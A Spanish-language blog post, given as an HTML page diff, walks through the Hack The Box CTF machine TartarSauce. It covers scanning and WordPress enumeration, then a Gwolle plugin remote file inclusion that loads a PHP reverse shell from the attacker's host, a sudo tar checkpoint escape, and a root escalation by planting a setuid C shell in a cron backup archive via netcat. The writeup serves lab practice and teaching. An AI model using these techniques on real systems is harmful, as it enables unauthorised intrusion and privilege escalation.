@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>OSCP Path ~ TartarSauce de Hack The Box (Necesario VIP) | Pirrandi Blog</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="OSCP Path ~ TartarSauce de Hack The Box (Necesario VIP)" />
+<meta name="author" content="Pirrandi" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Writeup de la maquina de HackTheBox llamada TTARTARSAUCE siguiendo el PATH para el OSCP" />
+<meta property="og:description" content="Writeup de la maquina de HackTheBox llamada TTARTARSAUCE siguiendo el PATH para el OSCP" />
+<link rel="canonical" href="http://localhost:4000/2021/08/02/TartarSauce.html" />
+<meta property="og:url" content="http://localhost:4000/2021/08/02/TartarSauce.html" />
+<meta property="og:site_name" content="Pirrandi Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-02T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="OSCP Path ~ TartarSauce de Hack The Box (Necesario VIP)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Pirrandi"},"dateModified":"2021-08-02T00:00:00-03:00","datePublished":"2021-08-02T00:00:00-03:00","description":"Writeup de la maquina de HackTheBox llamada TTARTARSAUCE siguiendo el PATH para el OSCP","headline":"OSCP Path ~ TartarSauce de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/08/02/TartarSauce.html"},"url":"http://localhost:4000/2021/08/02/TartarSauce.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Pirrandi Blog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pirrandi Blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="" class="author-avatar" alt="Avatar" />
+    
+Este es mi blog personal sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">OSCP Path ~ TartarSauce de Hack The Box (Necesario VIP)</h1>
+  
+  <div class="post-tags">
+     
+      <a class="tag" href="/tag/HTB,/">HTB,</a>
+      
+      <a class="tag" href="/tag/OSCP/">OSCP</a>
+      
+      <a class="tag" href="/tag/Path,/">Path,</a>
+      
+      <a class="tag" href="/tag/Wordpress,/">Wordpress,</a>
+      
+      <a class="tag" href="/tag/Wpscan,/">Wpscan,</a>
+      
+      <a class="tag" href="/tag/Plugins,/">Plugins,</a>
+      
+      <a class="tag" href="/tag/Gwolle,/">Gwolle,</a>
+      
+      <a class="tag" href="/tag/tar,/">tar,</a>
+      
+      <a class="tag" href="/tag/python,/">python,</a>
+      
+      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
+      
+      <a class="tag" href="/tag/Retiradas,/">Retiradas,</a>
+      
+      <a class="tag" href="/tag/Writeup,/">Writeup,</a>
+      
+      <a class="tag" href="/tag/Hacking/">Hacking</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 02 Aug 2021</div>
+  
+  <noscript>
+    <div class="post-description">Writeup de la maquina de HackTheBox llamada TTARTARSAUCE siguiendo el PATH para el OSCP</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="tartarsauce--hack-the-box-to-oscp">TartarSauce ~ Hack The Box to OSCP</h1>
+
+<p>Realizamos el Primer escaneo con Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.88       "</span>
+</code></pre></div></div>
+<p>Procedemos con el siguiente escaneo de Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-robots.txt: 5 disallowed entries 
+| /webservices/tar/tar/source/ 
+| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
+|_/webservices/developmental/ /webservices/phpmyadmin/
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Landing Page
+</code></pre></div></div>
+<p>Lanzamos la herramienta <code class="language-plaintext highlighter-rouge">Whatweb</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.88:80 <span class="o">[</span>200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.88], Title[Landing Page]
+</code></pre></div></div>
+
+<p>Procedemos a enumerar los directorios encontrados en busca de rutas alternativas.
+Encontramos que para la ruta <code class="language-plaintext highlighter-rouge">http://10.10.10.88/webservices/</code> nos devuelve un <code class="language-plaintext highlighter-rouge">FORBIDEN</code>
+Procedemos a Fuzzear por ahi con la herramienta <code class="language-plaintext highlighter-rouge">Wfuzz</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># wfuzz -c -L --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.88/webservices/FUZZ</span>
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://10.10.10.88/webservices/FUZZ
+Total requests: 220547
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                                                                            
+<span class="o">=====================================================================</span>
+
+000000780:   200        197 L    567 W      11237 Ch    <span class="s2">"wp"</span>
+</code></pre></div></div>
+<p>Apuntamos a esta ruta desde el navegador y vemos que tenemos un <code class="language-plaintext highlighter-rouge">Wordpress</code> asique vamos a proceder a enumerarlo bien con la herramienta <code class="language-plaintext highlighter-rouge">wpscan</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># wpscan --url http://10.10.10.88/webservices/wp -e ap --plugins-detection mixed </span>
+_______________________________________________________________
+         __          _______   _____
+         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
+          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
+           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.14
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88]
+[+] Started: Tue Aug  3 19:06:27 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.10.88/webservices/wp/, Match: '</span>wp-includes<span class="se">\/</span>js<span class="se">\/</span>wp-emoji-release.min.js?ver<span class="o">=</span>4.9.4<span class="s1">'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.10.88/webservices/wp/, Match: '</span>WordPress 4.9.4<span class="s1">'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Passive and Aggressive Methods)
+2021-08-03 19:38:01 VERIFY OK: depth=1, C=UK, ST=City, L=London, O=HackTheBox, CN=HackTheBox CA, name=htb, emailAddress=info@hackthebox.eu451) 99.00%  ETA: 00:00:19
+2021-08-03 19:38:01 VERIFY KU OK                                                                                                                                    
+2021-08-03 19:38:01 Validating certificate extended key usage                                                                                                       
+2021-08-03 19:38:01 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication                                               
+2021-08-03 19:38:01 VERIFY EKU OK                                                                                                                                   
+2021-08-03 19:38:01 VERIFY OK: depth=0, C=UK, ST=City, L=London, O=HackTheBox, CN=htb, name=htb, emailAddress=info@hackthebox.eu                                    
+2021-08-03 19:38:01 Outgoing Data Channel: Cipher '</span>AES-256-GCM<span class="s1">' initialized with 256 bit key================================ &gt; (93520 / 94451) 99.01%  ETA: 00:00:19
+2021-08-03 19:38:01 Incoming Data Channel: Cipher '</span>AES-256-GCM<span class="s1">' initialized with 256 bit key                                                                        
+2021-08-03 19:38:01 Control Channel: TLSv1.2, cipher TLSv1.2 ECDHE-RSA-AES256-GCM-SHA384, 2048 bit RSA                                                              
+ Checking Known Locations - Time: 00:31:37 &lt;================================================================================&gt; (94451 / 94451) 100.00% Time: 00:31:37
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)                                                                                                   
+                                                                                                                                                                    
+[i] Plugin(s) Identified:                                                                                                                                           
+                                                                                                                                                                    
+[+] akismet                                                                                                                                                         
+ | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/                                                                                          
+ | Last Updated: 2021-07-06T20:28:00.000Z
+ | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
+ | [!] The version is out of date, the latest version is 4.1.10
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200
+ |
+ | Version: 4.0.3 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
+
+[+] brute-force-login-protection
+ | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/
+ | Latest Version: 1.5.3 (up to date)
+ | Last Updated: 2017-06-29T10:39:00.000Z
+ | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/, status: 403
+ |
+ | Version: 1.5.3 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
+
+"[+] gwolle-gb"
+ | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
+ | Last Updated: 2021-06-04T10:57:00.000Z
+ | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
+ | [!] The version is out of date, the latest version is 4.1.2
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
+ |
+ | Version: 2.3.10 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Tue Aug  3 19:38:15 2021
+[+] Requests Done: 94492
+[+] Cached Requests: 7
+[+] Data Sent: 27.511 MB
+[+] Data Received: 12.735 MB
+[+] Memory used: 435.852 MB
+[+] Elapsed time: 00:31:47
+
+
+</span></code></pre></div></div>
+
+<p>Buscamos por el <code class="language-plaintext highlighter-rouge">plugin Gwolle</code> en <code class="language-plaintext highlighter-rouge">Searchsploit</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># searchsploit Gwolle                                                                                                                                  </span>
+<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                               |  Path
+<span class="nt">---------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion           | php/webapps/38861.txt
+<span class="nt">----------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+<h1 id="acceso-inicial---plugin-gwolle-wordpress">Acceso Inicial - Plugin Gwolle Wordpress</h1>
+<p>Procedemos a seguir los pasos para ejecutar el <code class="language-plaintext highlighter-rouge">RFI</code> y ganar acceso a la maquina Victima
+Atraves de la vulnerabilidad de Gwolle de wordpress 
+Posteamos nuestro tipica <code class="language-plaintext highlighter-rouge">php-reverse-shell</code> en un archivito malicioso con nombre de <code class="language-plaintext highlighter-rouge">wp-load.php</code>
+Procedemos a preparar la peticion para el acceso a nivel web que nos va a cargar nuestro archivo <code class="language-plaintext highlighter-rouge">wp-load.php</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath<span class="o">=</span>http://10.10.16.241/
+</code></pre></div></div>
+<p>Tenemos que postear nuestro archivo con un servidor con python3 para que se encuentre visible para la peticion de la maquina victima</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Accedemos
+
+hacemos <span class="nb">sudo</span> <span class="nt">-l</span> 
+www-data@TartarSauce:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>www-data on TartarSauce:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User www-data may run the following commands on TartarSauce:
+    <span class="o">(</span>onuma<span class="o">)</span> NOPASSWD: /bin/tar
+</code></pre></div></div>
+<p>Podemos usar como onuma el comando /tar
+hacemos lo siguiente</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> onuma <span class="nb">tar</span> <span class="nt">-cf</span> /dev/null /dev/null <span class="nt">--checkpoint</span><span class="o">=</span>1 <span class="nt">--checkpoint-action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span>/bin/sh  
+</code></pre></div></div>
+<p>Y ya nos spawneamos una shell como el usuario Onuma Yeahhh</p>
+
+<h1 id="escalada-de-privilegios-a-root">Escalada de Privilegios a Root</h1>
+<p>Encontramos que cada 5min se esta ejecutando este script por el user root</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div></div>
+
+<p>Procedemos a hechar un vistazo al script en si para ver que esta haciendo</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">onuma</span><span class="o">@</span><span class="n">TartarSauce</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">backuperer</span>
+<span class="c1">#!/bin/bash
+</span>
+<span class="c1">#-------------------------------------------------------------------------------------
+# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
+# ONUMA Dev auto backup program
+# This tool will keep our webapp backed up incase another skiddie defaces us again.
+# We will be able to quickly restore from a backup in seconds ;P
+#-------------------------------------------------------------------------------------
+</span>
+<span class="c1"># Set Vars Here
+</span><span class="n">basedir</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span>
+<span class="n">bkpdir</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span>
+<span class="n">tmpdir</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span>
+<span class="n">testmsg</span><span class="o">=</span><span class="err">$</span><span class="n">bkpdir</span><span class="o">/</span><span class="n">onuma_backup_test</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">errormsg</span><span class="o">=</span><span class="err">$</span><span class="n">bkpdir</span><span class="o">/</span><span class="n">onuma_backup_error</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">tmpfile</span><span class="o">=</span><span class="err">$</span><span class="n">tmpdir</span><span class="o">/</span><span class="p">.</span><span class="err">$</span><span class="p">(</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">head</span> <span class="o">-</span><span class="n">c100</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">urandom</span> <span class="o">|</span><span class="n">sha1sum</span><span class="o">|</span><span class="n">cut</span> <span class="o">-</span><span class="n">d</span><span class="s">' '</span> <span class="o">-</span><span class="n">f1</span><span class="p">)</span>
+<span class="n">check</span><span class="o">=</span><span class="err">$</span><span class="n">tmpdir</span><span class="o">/</span><span class="n">check</span>
+
+<span class="c1"># formatting
+</span><span class="n">printbdr</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="err">$</span><span class="p">(</span><span class="n">seq</span> <span class="mi">72</span><span class="p">);</span>
+    <span class="n">do</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">printf</span> <span class="err">$</span><span class="s">"-"</span><span class="p">;</span>
+    <span class="n">done</span>
+<span class="p">}</span>
+<span class="n">bdr</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">printbdr</span><span class="p">)</span>
+
+<span class="c1"># Added a test file to let us see when the last backup was run
+</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">printf</span> <span class="err">$</span><span class="s">"$bdr</span><span class="se">\n</span><span class="s">Auto backup backuperer backup last ran at : $(/bin/date)</span><span class="se">\n</span><span class="s">$bdr</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;</span> <span class="err">$</span><span class="n">testmsg</span>
+
+<span class="c1"># Cleanup from last time.
+</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">rm</span> <span class="o">-</span><span class="n">rf</span> <span class="err">$</span><span class="n">tmpdir</span><span class="o">/</span><span class="p">.</span><span class="o">*</span> <span class="err">$</span><span class="n">check</span>
+
+<span class="c1"># Backup onuma website dev files.
+</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sudo</span> <span class="o">-</span><span class="n">u</span> <span class="n">onuma</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">tar</span> <span class="o">-</span><span class="n">zcvf</span> <span class="err">$</span><span class="n">tmpfile</span> <span class="err">$</span><span class="n">basedir</span> <span class="o">&amp;</span>
+
+<span class="c1"># Added delay to wait for backup to complete if large files get added.
+</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sleep</span> <span class="mi">30</span>
+
+<span class="c1"># Test the backup integrity
+</span><span class="n">integrity_chk</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">diff</span> <span class="o">-</span><span class="n">r</span> <span class="err">$</span><span class="n">basedir</span> <span class="err">$</span><span class="n">check</span><span class="err">$</span><span class="n">basedir</span>
+<span class="p">}</span>
+
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mkdir</span> <span class="err">$</span><span class="n">check</span>
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">tar</span> <span class="o">-</span><span class="n">zxvf</span> <span class="err">$</span><span class="n">tmpfile</span> <span class="o">-</span><span class="n">C</span> <span class="err">$</span><span class="n">check</span>
+<span class="k">if</span> <span class="p">[[</span> <span class="err">$</span><span class="p">(</span><span class="n">integrity_chk</span><span class="p">)</span> <span class="p">]]</span>
+<span class="n">then</span>
+    <span class="c1"># Report errors so the dev can investigate the issue.
+</span>    <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">printf</span> <span class="err">$</span><span class="s">"$bdr</span><span class="se">\n</span><span class="s">Integrity Check Error in backup last ran :  $(/bin/date)</span><span class="se">\n</span><span class="s">$bdr</span><span class="se">\n</span><span class="s">$tmpfile</span><span class="se">\n</span><span class="s">"</span> <span class="o">&gt;&gt;</span> <span class="err">$</span><span class="n">errormsg</span>
+    <span class="n">integrity_chk</span> <span class="o">&gt;&gt;</span> <span class="err">$</span><span class="n">errormsg</span>
+    <span class="nb">exit</span> <span class="mi">2</span>
+<span class="k">else</span>
+    <span class="c1"># Clean up and save archive to the bkpdir.
+</span>    <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mv</span> <span class="err">$</span><span class="n">tmpfile</span> <span class="err">$</span><span class="n">bkpdir</span><span class="o">/</span><span class="n">onuma</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">dev</span><span class="p">.</span><span class="n">bak</span>
+    <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">rm</span> <span class="o">-</span><span class="n">rf</span> <span class="err">$</span><span class="n">check</span> <span class="p">.</span><span class="o">*</span>
+    <span class="nb">exit</span> <span class="mi">0</span>
+<span class="n">fi</span>
+</code></pre></div></div>
+<p>Paso 1 en nuestyro kali nos creamos una ruta de directorios /var/www/html con un archivo privesc</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># tree                                  </span>
+<span class="nb">.</span>
+├── privesc
+├── privesc.c
+├── privesc.tar.gz
+└── var
+    └── www
+        └── html
+            └── privesc
+</code></pre></div></div>
+<p>El archivo privesc es un archivo escrito en .C que compilamos  y damos estos permisos de ejecucion</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat privesc.c                                                                                                                                               1 ⚙</span>
+
+int main<span class="o">()</span> <span class="o">{</span>
+        setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+        system<span class="o">(</span><span class="s2">"/bin/bash -p"</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>Compilado en c</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># gcc -m32 privesc.c -o privesc </span>
+</code></pre></div></div>
+<p>Le damos privilegios</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ls -l </span>
+total 16
+<span class="nt">---S--Sr-x</span> 1 root root 15524 ago  2 10:10 privesc		<span class="nb">chmod </span>6005 privesc
+</code></pre></div></div>
+<p>Una vez pasamos de privesc.c al compilado privesc tenemos que comprimir el archivo para que nos quede el privesc.tar.gz</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>root💀pro<span class="o">)</span>-[/home/…/Escritorio/HTB/TartarSauce/scrips]
+└─# <span class="nb">ls</span> <span class="nt">-la</span>
+total 36
+drwxr-xr-x 3 root root  4096 ago  2 11:38 <span class="nb">.</span>
+drwxr-xr-x 7 root root  4096 ago  1 10:42 ..
+<span class="nt">---S--Sr-x</span> 1 root root 15524 ago  2 10:02 privesc
+<span class="nt">-rw-r--r--</span> 1 root root    53 ago  2 09:54 privesc.c
+<span class="nt">-rw-r--r--</span> 1 root root  2738 ago  2 11:38 privesc.tar.gz
+drwxr-xr-x 3 root root  4096 ago  2 10:09 var
+</code></pre></div></div>
+<p>Comprimios el archivo desde la ruta</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># tar -zcvf privesc.tar.gz var/www/html/        </span>
+var/www/html/
+var/www/html/privesc
+</code></pre></div></div>
+
+<p>Procedemos a compartir nuestro archivo privesc.tar.gz para que cuando la tarea cron ejecute el scrip backuperer y saque el hash en el directorio /var/tmp/</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>root💀pro<span class="o">)</span>-[/home/…/Escritorio/HTB/TartarSauce/scrips]
+└─# nc <span class="nt">-vlnp</span> 4444 &lt; privesc.tar.gz        
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.10.16.241] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.88] 49796
+</code></pre></div></div>
+<p>Rapidamente nosotros le hagamos el siguiente paso:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>onuma@TartarSauce:/var/tmp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 11284
+drwxrwxrwt 10 root  root      4096 Aug  2 05:52 <span class="nb">.</span>
+drwxr-xr-x 14 root  root      4096 Feb  9  2018 ..
+<span class="s2">"-rw-r--r--  1 onuma onuma 11511673 Aug  2 05:52 .5bff277d80d9f0c3d3df5e456214928b3eb07262     "</span>
+drwx------  3 root  root      4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
+drwx------  3 root  root      4096 May 29  2020 systemd-private-4e3fb5c5d5a044118936f5728368dfc7-systemd-timesyncd.service-SksmwR
+</code></pre></div></div>
+<p>Procedemos a meter nuestro archivo comprimido y seteado en el hash en un margen de 30seg antes de que se borre</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>onuma@TartarSauce:/var/tmp<span class="nv">$ </span>nc 10.10.16.241 4444 <span class="o">&gt;</span> .5bff277d80d9f0c3d3df5e456214928b3eb07262
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>onuma@TartarSauce:/var/tmp$ ls -la
+total 48
+drwxrwxrwt 11 root  root  4096 Aug  2 05:53 .
+drwxr-xr-x 14 root  root  4096 Feb  9  2018 ..
+-rw-r--r--  1 onuma onuma 2738 Aug  2 05:53 .5bff277d80d9f0c3d3df5e456214928b3eb07262
+" drwxr-xr-x  3 root  root  4096 Aug  2 05:53 check " 
+drwx------  3 root  root  4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
+drwx------  3 root  root  4096 May 29  2020 systemd-private-4e3fb5c5d5a044118936f5728368dfc7-systemd-timesyncd.service-SksmwR
+</code></pre></div></div>
+<p>Conseguimos entrar en la seccion del script de python que nos interesaba para poder alcanzar nuestro recurso compartido atraves de la ejeccucion de root del scrip visto</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>onuma@TartarSauce:/var/tmp/check<span class="nv">$ </span><span class="nb">cd </span>var/www/html
+onuma@TartarSauce:/var/tmp/check/var/www/html<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 24
+drwxr-xr-x 2 root root  4096 Aug  2 04:10 <span class="nb">.</span>
+drwxr-xr-x 3 root root  4096 Aug  2 05:53 ..
+<span class="nt">---S--Sr-x</span> 1 root root 15524 Aug  2 04:10 privesc
+onuma@TartarSauce:/var/tmp/check/var/www/html<span class="nv">$ </span>./privesc 
+root@TartarSauce:/var/tmp/check/var/www/html# <span class="nb">whoami
+</span>root
+
+root@TartarSauce:/var/tmp/check# <span class="nb">cat</span> /root/root.txt     
+e79abdab8b8a4b64f857xxxxxxxxxxxx
+</code></pre></div></div>
+
+<p>Maquina Rootead =D !! Seguimos Full Hacks</p>
+
+</div>
+
+
+<div class="comments">
